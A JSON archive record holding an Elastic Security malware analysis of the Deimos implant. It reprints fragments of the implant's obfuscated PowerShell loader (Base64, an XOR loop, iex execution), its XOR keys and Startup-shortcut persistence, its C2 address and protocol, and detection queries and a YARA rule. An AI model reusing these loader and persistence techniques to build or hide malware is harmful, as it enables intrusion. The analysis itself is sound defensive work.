{
    "id": "44d5abb8-8fac-48ce-b4b5-0ca437e4a5f5",
    "created_at": "2023-01-12T15:03:52.986201Z",
    "updated_at": "2025-03-27T02:05:35.054263Z",
    "deleted_at": null,
    "sha1_hash": "685e5af3193d7880160d25ca186fdd79cf2c6e56",
    "title": "2021-10-12 - Going Coast to Coast - Climbing the Pyramid with the Deimos Implant",
    "authors": "",
    "file_creation_date": "2022-05-28T23:16:36Z",
    "file_modification_date": "2022-05-28T23:16:36Z",
    "file_size": 2809864,
    "plain_text": "# Going Coast to Coast - Climbing the Pyramid with the Deimos Implant\n\n**[elastic.co/blog/going-coast-to-coast-climbing-the-pyramid-with-the-deimos-implant](https://www.elastic.co/blog/going-coast-to-coast-climbing-the-pyramid-with-the-deimos-implant)**\n\nBy\n\nElastic Security Intelligence & Analytics Team\n\n12 October 2021\n\nThe key takeaways of this analysis are as follows:\n\nA remote access tool is actively being developed in campaigns beyond the initially reported\nJupyter Infostealer, SolarMarker, and Yellow Cockatoo campaigns\nThe malware employs multiple layers of complex obfuscation and encryption techniques\nThe malware has incorporated convincing lure files and digitally signed installation executables\nThe malware is part of intrusion sets that are used to establish an initial foothold and maintain\npersistence into contested environments\nA successful takedown was completed by the Elastic Security team for the observed C2\ninfrastructure\n\nThe Deimos implant is a new, complex form of malware first reported in 2020. This remote access tool\nis under active development, with the aim of evading detection by using multiple layers of complex\nobfuscation and encryption techniques.\n\n\n-----\n\nThese advanced defensive countermeasures, which also include convincing lure files and digitally\nsigned installation executables, can frustrate identification and analysis. However, the Elastic Security\nteam recently completed a successful takedown of the observed command and control (C2)\ninfrastructure, allowing us to provide detection rules and hunting techniques to aid in identifying this\npowerful implant.\n\nThis post details the tactics, techniques, and procedures, or TTPs, of the Deimos implant. Our goal is\nto help security practitioners leverage the Elastic Stack to collect and analyze malware and intrusion\ndata by revealing information about how Deimos works that its creators have attempted to obscure for\ndefensive purposes.\n\n## Overview\n\nThe Elastic Intelligence & Analytics team tracks a new strain of the Deimos initial access and\n[persistence implant previously associated with the Jupyter Infostealer malware (tracked elsewhere as](https://www.binarydefense.com/mars-deimos-solarmarker-jupyter-infostealer-part-1)\n[Yellow Cockatoo, and](https://redcanary.com/blog/yellow-cockatoo) [SolarMarker). This implant has demonstrated a maturation of obfuscation](https://www.crowdstrike.com/blog/solarmarker-backdoor-technical-analysis)\ntechniques as a result of published research. This indicates that the activity group is actively modifying\nits codebase to evade detective countermeasures.\n\nThe sample we observed was not leveraged as an information stealer. It is an implant that provides\ninitial access, persistence, and C2 functions. This makes the implant powerful in that it can be used to\naccomplish any tasks that require remote access. It is likely that these intrusions are the beginning of\na concentrated campaign against the victims or will be sold off in bulk for other campaigns\nunassociated with the access collection.\n\n[The analysis will leverage David Bianco's Pyramid of Pain analytical model to describe the value of](http://detect-respond.blogspot.com/2013/03/the-pyramid-of-pain.html)\natomic indicators, artifacts, tool-markings, and TTPs to the malware authors and how uncovering them\ncan impact the efficiency of the intrusion sets leveraging this implant. Additionally, we are providing\nsome host-based hunting techniques and detection rules that can be leveraged to identify this implant\nand others that share similar artifacts and TTPs.\n\n## Details\n\nOn August 31, 2021, Elastic observed process injection telemetry that shared techniques with the\n[Jupyter Infostealer as reported by Morphisec, Binary Defense, and security researcher Squibydoo [1]](https://blog.morphisec.com/jupyter-infostealer-backdoor-introduction)\n\n[[2] [3] [4] [5]. As we began analysis and compared the samples we observed to prior research, we](https://blog.morphisec.com/new-jupyter-evasive-delivery-through-msi-installer)\nidentified a change in the way obfuscation was implemented. This change may be the result of several\nfactors, one of which is an attempt by the adversary to bypass or otherwise evade existing defenses or\nmalware analysis.\n\n_Note: As previous versions of this malware have been thoroughly documented, we will focus on newly_\n_observed capabilities and functionality._\n\nDuring dynamic analysis of the malware, we observed behavior similar to that which had been\nreported elsewhere - namely obfuscation using a litany of runtime-created variables (variables that are\nunique to each execution), directories, an XOR cipher, and Base64 encoded commands. Below, is an\nexample of the new obfuscation tactics employed by the malware author to hinder analysis. We'll\ndiscuss this in detail as we unpack the malware's execution.\n\n\n-----\n\n```\n C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe command\n\"$650326ac2b1100c4508b8a700b658ad7='C:\\Users\\user1\\d2e227be5d58955a8d12db18fca5d787\\a5fb52fc397\n[System.Convert]::FromBase64String([System.IO.File]::ReadAllText($650326ac2b1100c4508b8a700b658\nitem $650326ac2b1100c4508b8a700b658ad7;for($i=0;$i -lt\n$d6ffa847bb31b563e9b7b08aad22d447.count;){for($j=0;$j -lt\n$1e3dadee7a4b45213f674cb23b07d4b0.length;$j++)\n{$d6ffa847bb31b563e9b7b08aad22d447[$i]=$d6ffa847bb31b563e9b7b08aad22d447[$i] -bxor\n$1e3dadee7a4b45213f674cb23b07d4b0[$j];$i++;if($i -ge $d6ffa847bb31b563e9b7b08aad22d447.count)\n{$j=$1e3dadee7a4b45213f674cb23b07d4b0.length}}};$d6ffa847bb31b563e9b7b08aad22d447=\n[System.Text.Encoding]::UTF8.GetString($d6ffa847bb31b563e9b7b08aad22d447);iex\n$d6ffa847bb31b563e9b7b08aad22d447;\"\n\n```\nFigure 1: PowerShell executed by malware installer\nThe sample we observed created a Base64-encoded file nested several subdirectories deep in the\n```\n%USERPROFILE% directory and referenced this file using a runtime variable in the PowerShell script\n\n```\n( $650326ac2b1100c4508b8a700b658ad7 in our sample). Once this encoded file was read by\nPowerShell, it is deleted as shown in Figure 2. Other published research observed the Base64 string\nwithin the PowerShell command which made it visible during execution. This shows an adaptation of\nthe obfuscation techniques leveraged by the malware authors in response to reports published by\nsecurity researchers.\n```\nFromBase64String([System.IO.File]::ReadAllText($650326ac2b1100c4508b8a700b658ad7));remove-item\n$650326ac2b1100c4508b8a700b658ad7\n\n```\nFigure 2: Base64 encoded file read and then deleted\nAdditionally, there was the inclusion of another variable ( $1e3dadee7a4b45213f674cb23b07d4b0 in\nour example) with a value of `hYaAOxeocQMPVtECUZFJwGHzKnmqITrlyuNiDRkpgdWbSsfjvLBX . By`\ndeobfuscating the PowerShell command, we determined that this value was the XOR key used to\ndecrypt the value of the `650326ac2b1100c4508b8a700b658ad7 file. Now that we had the location of`\nthe Base64 encoded file and the ability to decrypt it, we needed to prevent it from being deleted.\n\n[To do this, we leveraged the FileDelete event configuration for Sysmon. By default, this creates a](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon#event-id-23-filedelete-file-delete-archived)\ndirectory in the \" C:\\Sysmon \" directory and then places all deleted files (named by the file MD5 +\nSHA256 hashes + 33 0's + extension) in that folder. This directory is only available to the `SYSTEM`\nuser. We used [PSExec to access the folder ( psexec -sid cmd ). The file contained a single-line](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)\nBase64-encoded string.\n\nAs we observed in the PowerShell above, the contents are protected using an XOR cipher, but a\n[cipher we have the key for. Using the command-line tools base64 and](https://linux.die.net/man/1/base64) [xortool, we're able to decode](https://github.com/hellman/xortool)\nand decrypt the file:\n\nbase64\n\n-D - use the base64 program to decode\n-i - the input file to be decoded\n-o - the output file to save the decoded content\nxortool-xor\n\n-r - the XOR cipher key\n-f - the file that is XOR encrypted\n\n      - - output the decrypted file\n\n\n-----\n\n```\nbase64 D i 650326ac2b1100c4508b8a700b658ad7.encoded \\\n -o 650326ac2b1100c4508b8a700b658ad7.decoded\nxortool-xor -r hYaAOxeocQMPVtECUZFJwGHzKnmqITrlyuNiDRkpgdWbSsfjvLBX \\\n -f 650326ac2b1100c4508b8a700b658ad7.decoded \\\n > 650326ac2b1100c4508b8a700b658ad7.xor\n\n```\nFigure 3: Decrypting the XOR'd Base64 encoded file\nThis resulted in another obfuscated file that started with an XOR'd Base64-encoded variable and\nended with more PowerShell.\n```\n$adab58383614f8be4ed9d27508c2b='FTDSclNHUTdlaXBxnKdZa9pUUW9iakpFGDBaelBHbE9mbTVZYlVFbWIxZ...\n...CReaTEShorTcuT($ENV:APpDATa+'\\m'+'IcR'+'OSO'+'Ft'+'\\w'+'Ind'+'OW'+'S\\'+'sT'+'ARt'+' ME\n'+'nU'+'\\pr'+'OGR'+'aMS\\'+'sT'+'ART'+'uP'+'\\a44f066dfa44db9fba953a982d48b.LNk');$a78b0ce650249b\n13775a;$a78b0ce650249ba927e4cf43d02e5.WInDoWSTYLE=7;$a78b0ce650249ba927e4cf43d02e5.sAvE();IEx\n$a54b6e0f7564f4ad0bf41a1875401;\n\n```\nFigure 4: Final obfuscated file (truncated)\nFollowing the same process as before, we identified the XOR key (which may have been trying to use\nan = sign to appear to look like it was Base64) and decoded the file.\n```\nXjBrPGQ7aipqcXYkbTQobjJEX0ZzPGlOfm5YbUEmb1dBazZ0RlpCa2hLQks8eXNxK3tsRHpZVmtmUU9mb31jaVVuMXUxUGk\n\n```\nFigure 5: XOR cipher key\nThis process yielded a .NET DLL file that creates an implant tracking ID and files used for persistence\n(more about the tracking ID is in the Analysis - Initial Access section).\n```\nadab58383614f8be4ed9d27508c2b: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly,\nfor MS Windows\n\n```\nFigure 6: .NET DLL file type\nThe DLL calls itself Mars.Deimos and correlates to previous research by Morphisec, Binary Defense,\n[and security researcher Squibydoo [1] [2] [3] [4] [5]. The particular samples that we've observed utilize](https://blog.morphisec.com/jupyter-infostealer-backdoor-introduction)\n[the .NET hardening tool Dotfuscator CE 6.3.0 to hinder malware analysis.](https://www.preemptive.com/dotfuscator/ce/docs/help/index.html)\n\nWhat we found particularly interesting is that the authors have spent time modifying the malware in an\nattempt to make it harder to detect, indicating that they're incentivized to maintain the malware. This is\ngood to know as we move into the analysis phase because it means that we can make an impact on a\nvaluable malware implant that will frustrate those using it for financial gain.\n\n## Analysis\n\nAll indicators referenced in the analysis are located in the Indicators section.\n\n### The Pyramid of Pain\n\nBefore we get into the analysis, let's discuss the model we used to help guide our process.\n\n\n-----\n\n[In 2013, security researcher David Bianco released an analytical model called the Pyramid of Pain.](http://detect-respond.blogspot.com/2013/03/the-pyramid-of-pain.html)\nThe model is intended to understand how uncovering different parts of an intrusion can impact a\ncampaign. As you can see in the model below, identifying hash values are useful, but easily changed\nby an adversary whereas identifying TTPs is very difficult for an adversary to change.\n\nFigure 7: Pyramid of Pain\nThe goal of using the Pyramid of Pain is to understand as much about the intrusion as possible and\nproject the impact (read: the amount of \"pain\") you can inflict. Throughout the analysis of the observed\nsamples, we'll overlay them onto the Pyramid of Pain as an illustrative method to assess the potential\nimpact.\n\n### File Hashes\n\nOnce we identified that we had observed a new variant of the malware sample, we applied search\nqueries to our dataset and identified 10 unique organizations across multiple verticals, indicating that\nthis did not appear to be targeted. From those 10 organizations, we observed 10 different initialinstaller file hashes. The dropped encoded files are also all different.\n\nSo while this information is useful, it is apparent that using a file hash as a detection method would not\nbe useful across organizations.\n\n### IP Addresses\n\nAs other researchers have noted, we observed the same IP address used in the campaign. This IP\n[address was first associated with malicious files on August 30, 2021.](https://www.virustotal.com/gui/ip-address/216.230.232.134/relations)\n\n\n-----\n\n```\nIP      216.230.232.134\nAnycast   false\nCity     Houston\nRegion    Texas\nCountry   United States (US)\nLocation   29.7633,-95.3633\nOrganization AS40156 The Optimal Link Corporation\nPostal    77052\nTimezone   America/Chicago\n\n```\nFigure 8: Information on identified IP address\nThis IP address has been reported to multiple abuse sites and identified independently by multiple\nsecurity researchers. We initiated a successful takedown request of the IP address on September 21,\n2021, which has removed the observed C2 infrastructure access to any implants.\n\nWhile this atomic indicator is useful for blocking on a firewall, it is trivial for an adversary to change to\nanother IP address, so let’s try to get higher up the pyramid and make a bigger impact on the\nadversary.\n\n### Artifacts\n\n**Resource Development**\n\nThe lure file samples we analyzed were predominantly signed by organizations in Scandinavian and\nSlavic-speaking countries, with two outliers from English and French-speaking countries. Multiple\nsamples were signed with a digital certificate registered as a \"Spoloènos s Ruèením Obmedzeným\"\n(S.R.O.). An [S.R.O. is a business designation for Slovakian businesses owned by a foreign entity.](https://www.offshorecompany.com/company/slovakia-s-r-o/)\n\nThe S.R.O. that we observed as owning the digital signatures (SRO #1) was formed on July 29, 2021,\nand the signature was observed starting on August 26, 2021. Additionally, the S.R.O. that we\nobserved is owned by a different S.R.O. (SRO #2).\n\n\n-----\n\nFigure 9: Lure file digital signing S.R.O. (SRO #1) and owner (SRO #2)\nSRO #2 has been in business since August 19, 2014, and provides a variety of services. The owner of\nSRO #2 has a single-named partner located in a country in the former Eastern Bloc of Europe\n(Executive manager).\n\n\n-----\n\nFigure 10: SRO #2 and SRO #1 sharing the same executive manager\nWe are unable to state definitively if the organizations or people are intentionally involved, cutouts, or\nunwilling participants so we will not be naming them. This process of obtaining possibly stolen\ncertificates aligns with other samples we analyzed. It is obvious that however these certificates were\nprocured, the person (or persons) responsible appear well-versed with the bureaucracies and laws\nrequired in registering a foreign-owned business in Slovakia.\n\n**Initial Access**\n\nWe observed the most indicators in this tier. Indicators in the Artifacts tier, both host and network, are\nvaluable to a defender because they are difficult for an adversary to change without considerable\nrearchitecting of the way the malware functions. This differs from atomic indicators (hashes and\n\n\n-----\n\ninfrastructure) in that those elements are modular and can simply be updated. Artifacts, like cipher\nkeys (as we'll see below), are often hard-coded into the source code prior to compilation and require\nsignificant work to adjust.\n\nThe dropper creates a series of nested directories whose names are 32-characters long,\nalphanumeric, and lowercase. In all cases we've observed, there are six nested directories, and a\nsingle file within the final subdirectory using the same naming convention. During the initial execution,\nthis file is loaded, deobfuscated with a 52-byte static XOR key, and then executed as a PowerShell\nscript. We have included a hunting query in the Detection section that identifies this activity.\n\nAdditionally, the .Net assembly creates a string by listing all files located at\n```\n%USERPROFILE%\\APPDATA\\ROAMING . This is stored as the hwid value, which is a unique identifier\n\n```\nfor this machine. If the file doesn't exist yet, it is created by generating 32 random bytes and encoding\nthem with a custom Base64 encoding.\n\n**Persistence**\n\nOnce executed, the PowerShell script establishes persistence of the malware generating a random\nquantity between `100 and` `200 files in a directory named` `%APPDATA%\\Microsoft\\<random`\n```\nstring> . The random string contains only lowercase and uppercase letters A-Z and the digits 0-9. It\n\n```\ncould be anywhere between 10 to 20 characters in length. This directory is the staging directory.\nThese files contain randomly generated bytes between 50,000 bytes and 200,000 bytes. The files\nthemselves are named `<random string>.<random string>, where each random string follows the`\nsame convention as the directory name. Lastly, one final file is written to this directory which contains\nan obfuscated .Net DLL. This is the actual Deimos implant. It resembles the dummy files with similar\nattributes in this directory, further attempting to evade defenses.\n\nThe next function script will create two registry keys that provide a Windows shell handler for the first\nfile of random data created above. It uses the file extension of that file to associate a request to\nexecute it with running a PowerShell command. The registry keys are created at\n```\nHKEY_CURRENT_USER\\Software\\Classes\\<random string>\\, where the random string follows the\n\n```\nsame convention as mentioned above, except for all lowercase characters. The first key will further\nhave a subkey of `\\Shell\\Open\\Command that contains the loader PowerShell script. The string value`\nitself has mixed cases in an effort to be more difficult to search for. For example `PowErShELl was`\nused in our sample. The second key is effectively an alias that matches the file extension of the first\nrandomly generated file above. It's value matches the lowercase value of the random string used in\nthe first key's path.\n\nThe final persistence artifact is a `.LNk file that is placed in the user's StartUp directory. In this`\nsample, it is hard-coded to be named `a44f066dfa44db9fba953a982d48b.LNk . The shortcut is set to`\nlaunch the first randomly generated file above and will open in a minimized window. Upon user login,\nthe link file will tell Windows to launch the file, but it isn't executable. The registry keys above tell\nWindows to launch the PowerShell command configured in the first key above to execute the file. The\nPowerShell command contains the full path to the obfuscated .Net DLL and the XOR key to\ndeobfuscate it. Finally, the .Net DLL assembly will be executed by PowerShell by calling the class\nmethod [Mars.Deimos]::interact(). This persistence architecture can be difficult to follow in text, so\nbelow is a visual representation of the persistence mechanism.\n\n\n-----\n\nFigure 11: Persistence mechanism flow\n\n**Command and Control Phase**\n\nThe malware provides a general-purpose implant that can perform any action at its privilege level.\nNamely, it can receive and execute a Windows PE file, a PowerShell script, a .Net DLL assembly, or\nrun arbitrary PowerShell commands.\n\n\n-----\n\nThere are a few command-specific permutations of payload encapsulations, but they are passed to a\ncommon method to perform the web request to the C2 server. The web request uses an HTTP `POST`\nmethod and sets a 10-minute timeout on establishing communication.\n\nNo additional headers are set other than the default headers populated by the .Net `WebRequest`\nprovider, which are: `Host,` `Content-Length, and` `Connection: Keep-Alive .`\n```\nPOST / HTTP/1.1\nHost: 216.230.232.134\nContent-Length: 677\nConnection: Keep-Alive\n\n```\nFigure 12: C2 HTTP headers\nFigure 13 depicts the hex dump of the body of the client's POST request.\n\nFigure 13: C2 HTTP body\nThe first bytes in white are randomly generated and prepended to the body to obfuscate patterns in\nnetwork communication. There will be between 0 and 512 of these bytes. Next, shown in green, is a\nnull byte, marking the end of random data. The next 10 bytes, shown in blue, are a “cookie” value sent\nin the last communication from the server. This is likely to prevent replaying captured packets to the\n\n\n-----\n\nserver, as each communication is unique. There is nothing specific requiring this to be 10 bytes, but in\nall traffic we observed, this was the case. In the case of the initial check-in, this is not present. Finally,\nthe remaining bytes shown in red here are the encrypted body. For the initial check-in, this is exactly\n256-bytes of RSA encrypted data that includes the key that will be used in follow-on communications,\nand the unique hardware ID for this implant. For the remaining communications, the client uses AES128 CBC mode for encryption. For AES encryption, this portion will always be a multiple of 16-bytes in\nlength.\n\nThe RSA public key used for the initial handshake is unique for each campaign. Using the YARA rule\nin Figure 24, we were able to discover a total of 65 samples of the implant. The RSA key provided a\npivot to discern unique campaigns, spanning countries from the United States to Moldova. Only 12.5%\nof the samples included information stealing features, similar to what has been observed with the\nJupyter Infostealer. The rest of the samples were the Deimos implant with no additional info stealing\ncapabilities. This could mean that the implant is gaining in popularity as it is full-featured and can be\nused for initial access and persistence for any campaigns.\n\n**Main Loop**\n\nOnce the check-in process is completed, the main process loop begins. The default action of the\nimplant during the main loop is the `ping action.` `ping sends information about the environment,`\nincluding the machine name, Windows version, CPU architecture, information about if the user has\nadministrative privileges, and a version string for the implant.\n\nIf a task is scheduled for the implant, the response to the ping command will contain a status value\nthat is set to either \" file \" or \" command \". If no task is given, the implant will sleep for 20 seconds +\na random wait between 0 and 20 seconds. This is the wait time between all tasks.\n\nFor \" file \" tasks, the implant immediately performs another request using the `task_id attribute`\nfrom the task definition to retrieve the file. The implant expects an \" exe \" file, a \" ps1 \" file, or a\n\" module \", which is a .Net Assembly file.\n\nWhen an \" exe \" is downloaded, it will be written to a file in the `%TEMP%\\<RANDOM_NAME>.exe, where`\nRANDOM_NAME is a 24-character alphanumeric value with all capital letters. A new process is\nimmediately launched by executing the file and the status is reported on the next task interval.\n\nWhen a \" ps1 \" file is downloaded, the contents of the script are passed to a new PowerShell process\nusing Standard Input.\n\nFinally, \" module \" files are added to a \"plugin manager\" and executes the \" Run \" method.\n\nFor \" command \" tasks, no additional request is required. The \" command \" value from the response\ncontains PowerShell code that will be executed the same as the \" ps1 \" file type.\n\nPresumably, the difference is for quick scripts or perhaps interactive operations, the threat actor would\nuse the \" command \" type. For larger scripts, the \" file \" type would be used.\n\n### Tools\n\nLooking at the metadata from all of the observed samples, we can see a high-confidence connection\nin that they were all created using a single PDF software platform.\n\n\n-----\n\n```\nComments            : This installation was built with Inno Setup.\nCompany Name          :\nFile Description        : SlimReader Setup\nFile Version          :\nLegal Copyright         : (c) InvestTech\nOriginal File Name       :\nProduct Name          : SlimReader\nProduct Version         : 1.4.1.2\n\n```\nFigure 14: Malware lure file metadata\nWhile this software seems to be legitimate, it seems to be frequently used to create lure files. We have\nobserved 53 malware, or malware-adjacent, samples created using the `SlimReader tool.`\nAdditionally, the research team at eSentire [identified](https://www.esentire.com/security-advisories/hackers-flood-the-web-with-100-000-malicious-pages-promising-professionals-free-business-forms-but-are-delivering-malware-reports-esentire) `SlimReader as the tool of choice in the creation`\nof, as reported, many hundreds of thousands of lure files.\n\n### TTPs\n\nAt the very top of the pyramid, we observe a characteristic that is present in our samples as well as\nothers reported by security researchers. In all observed cases, the malware used techniques known\nas [Google Sneaky Redirects and](https://developers.google.com/search/docs/advanced/guidelines/sneaky-redirects) [Search Engine Optimization (SEO) Poisoning to trick users into](https://www.bankinfosecurity.com/how-seo-poisoning-used-to-deploy-malware-a-16882)\ninstalling the malware.\n\nSEO poisoning is a technique used to put SEO keywords in a document to inflate its ranking on\nsearch engines, so malicious documents and websites are higher on web search results. Additionally,\nGoogle Sneaky Redirects is a technique used to name the initial malware installer after the Google\nsearch as a way to fool the user into clicking on the file they downloaded. As an example, if a user\nsearches for \"free resume template\", and then clicks on a malicious website that appears to have that\nfile, they will be presented with a malware installer named, in this example, `free-resume-`\n```\ntemplate.exe . The malware will leverage a PDF icon even though it is an executable as an attempt\n\n```\nto trick the user into executing the PE file, which starts the PowerShell processes highlighted below in\nthe Elastic Analyzer view.\n\nFigure 15: Malware executing obfuscated PowerShell processes\n\n\n-----\n\nUnderstanding the malware processes as well as how it interacts with the different elements with the\nPyramid of Pain is paramount to inflicting long-term impacts to the activity group and intrusion sets.\n\n## Impact\n\nThe described intrusion sets leverage multiple tactics and techniques categorized by the MITRE\nATT&CK® framework. Other TTPs may exist, however, they were not observed during our analysis.\n\n### Tactics\n\n[Resource Development](https://attack.mitre.org/tactics/TA0042)\n[Initial Access](https://attack.mitre.org/tactics/TA0001)\n[Execution](https://attack.mitre.org/tactics/TA0002)\n[Persistence](https://attack.mitre.org/tactics/TA0003)\n[Defense Evasion](https://attack.mitre.org/tactics/TA0005)\n[Command and Control](https://attack.mitre.org/tactics/TA0011)\n\n### Techniques / Sub Techniques\n\n[Develop Capabilities -](https://attack.mitre.org/techniques/T1587) [Malware,](https://attack.mitre.org/techniques/T1587/001) [Code Signing Certificates or](https://attack.mitre.org/techniques/T1587/002) [Obtain Capabilities -](https://attack.mitre.org/techniques/T1588) [Malware,](https://attack.mitre.org/techniques/T1588/001)\n[Code Signing Certificates](https://attack.mitre.org/techniques/T1588/003)\n[Drive-by Compromise](https://attack.mitre.org/techniques/T1189/)\n[User Execution -](https://attack.mitre.org/techniques/T1204) [Malicious File](https://attack.mitre.org/techniques/T1204/002)\n[Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140)\n\n## Detection\n\n[There is an existing detection rule that will generically identify this activity. We are also releasing two](https://www.elastic.co/guide/en/security/8.2/startup-persistence-by-a-suspicious-process.html)\nadditional rules to detect these techniques. Additionally, we are providing hunting queries that can\nidentify other intrusion sets leveraging similar techniques.\n\n### Detection Logic\n\nElastic maintains a public repository for detection logic using the Elastic Stack and Elastic Endgame.\n\n### New Detection Rules\n\n[Suspicious Registry Modifications](https://github.com/elastic/detection-rules/issues/1488)\n\n[Abnormal File Extension in User AppData Roaming Path](https://github.com/elastic/detection-rules/issues/1489)\n\n### Hunting Queries\n\nThese queries can be used in Kibana's Security -> Timelines -> New Timeline → Correlation query\neditor. While these queries will identify this intrusion set, they can also identify other events of note\nthat, once investigated, could lead to other malicious activities.\n\nThis query will identify the initial dropped file containing the obfuscated installer.\n```\nfile where file.path regex \"\"\"C:\\\\Users\\\\[^\\\\]*\\\\([a-z0-9]{32}\\\\){6}[a-z0-9]{32}\"\"\"\n\n```\n\n-----\n\nFigure 16: Hunt query identifying initial installer\n\nFigure 17: Hunt query identifying initial installer using Timelines\nThis query will identify the unique “Hardware ID” file ( hwid ) that is created the first time the implant is\nrun. This ID file is used to uniquely identify this installation.\n```\nfile where file.path regex~ \"\"\".*\\\\APPDATA\\\\ROAMING\\\\[A-Za-z0-9_]{96,192}\"\"\"\n\n```\nFigure 18: Hunt query identifying Hardware ID\n\n\n-----\n\nFigure 19: Hunt query identifying Hardware ID using Timelines\nThis query will identify any files with a file extension of ten or more characters in the AppData\\Roaming\npath.\n```\nfile where file.path : \"*\\\\appdata\\\\roaming\\\\*\" and \nlength(file.extension) >= 10 and \nprocess.name : (\"cmd.exe\", \"powershell.exe\", \"wmic.exe\", \"mshta.exe\", \"pwsh.exe\",\n\"cscript.exe\", \"wscript.exe\", \"regsvr32.exe\", \"RegAsm.exe\", \"rundll32.exe\", \"EQNEDT32.EXE\",\n\"WINWORD.EXE\", \"EXCEL.EXE\", \"POWERPNT.EXE\", \"MSPUB.EXE\", \"MSACCESS.EXE\", \"iexplore.exe\",\n\"InstallUtil.exe\")\n\n```\nFigure 20: Hunt query identifying long file extensions\n\n\n-----\n\nFigure 21: Hunt query identifying long file extensions in Timelines\nThis query will identify a long string value containing the word \"powershell\" in the Registry.\n```\nregistry where registry.data.strings : \"*powershell*\" and length(registry.data.strings) >=\n100\n\n```\nFigure 22: Hunt query identifying long Registry strings\n\nFigure 23: Hunt query identifying long Registry strings in Timelines\n\n### YARA Rules\n\n\n-----\n\nWe have created a YARA rule to identify the presence of the Deimos trojan DLL file described in this\npost.\n```\nrule Windows_Trojan_Deimos_DLL {\n  meta:\n    author = \"Elastic Security\"\n    creation_date = \"2021-09-18\"\n    last_modified = \"2021-09-18\"\n    os = \"Windows\"\n    arch = \"x86\"\n    category_type = \"Trojan\"\n    family = \"Deimos\"\n    threat_name = \"Windows.Trojan.Deimos\"\n    description = \"Detects the presence of the Deimos trojan DLL file.\"\n    reference = \"\"\n    reference_sample = \"2c1941847f660a99bbc6de16b00e563f70d900f9dbc40c6734871993961d3d3e\"\n  strings:\n    $a1 = \"\\\\APPDATA\\\\ROAMING\" wide fullword\n    $a2 = \"{\\\"action\\\":\\\"ping\\\",\\\"\" wide fullword\n    $a3 = \"Deimos\" ascii fullword\n    $b1 = { 00 57 00 58 00 59 00 5A 00 5F 00 00 17 75 00 73 00 65 00 72 00 }\n    $b2 = { 0C 08 16 1F 68 9D 08 17 1F 77 9D 08 18 1F 69 9D 08 19 1F 64 9D }\n  condition:\n    all of ($a*) or 1 of ($b*)\n}\n\n```\nFigure 24: Deimos DLL YARA Rule\nYou can access this YARA rule [here.](https://github.com/elastic/examples/tree/master/blog/climbing-the-pyramid-with-celestial-themed-malware)\n\n## Defensive Recommendations\n\nThe following steps can be leveraged to improve a network's protective posture.\n\n1. Review and implement the above detection logic within your environment using technology such\n\nas Sysmon and the Elastic Endpoint or Winlogbeat.\n2. Review and ensure that you have deployed the latest Microsoft Security Updates\n3. Maintain backups of your critical systems to aid in quick recovery.\n\n## References\n\nThe following research was referenced throughout the document:\n\n## Indicators\n\n**Indicators** **Type** **Note**\n\n\n`f268491d2f7e9ab562a239ec56c4b38d669a7bd88181efb0bd89e450c68dd421` SHA256\nhash\n\n\nLure file\n\n\n-----\n\n**Indicators** **Type** **Note**\n\n\n`af1e952b5b02ca06497e2050bd1ce8d17b9793fdb791473bdae5d994056cb21f` SHA256\nhash\n\n`d6e1c6a30356009c62bc2aa24f49674a7f492e5a34403344bfdd248656e20a54` SHA256\nhash\n\n`216[.]230[.]232[.]134` IP\naddress\n\n**We're hiring**\n\n\nMalware\ninstaller\n\n.NET DLL\nfile\n\nCommand\nand\ncontrol\n\n\nWork for a global, distributed team where finding someone like you is just a Zoom meeting away.\nFlexible work with impact? Development opportunities from the start?\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-10-12 - Going Coast to Coast - Climbing the Pyramid with the Deimos Implant.pdf"
    ],
    "report_names": [
        "2021-10-12 - Going Coast to Coast - Climbing the Pyramid with the Deimos Implant.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535832,
    "ts_updated_at": 1743041135,
    "ts_creation_date": 1653779796,
    "ts_modification_date": 1653779796,
    "files": {
        "pdf": "https://archive.orkl.eu/685e5af3193d7880160d25ca186fdd79cf2c6e56.pdf",
        "text": "https://archive.orkl.eu/685e5af3193d7880160d25ca186fdd79cf2c6e56.txt",
        "img": "https://archive.orkl.eu/685e5af3193d7880160d25ca186fdd79cf2c6e56.jpg"
    }
}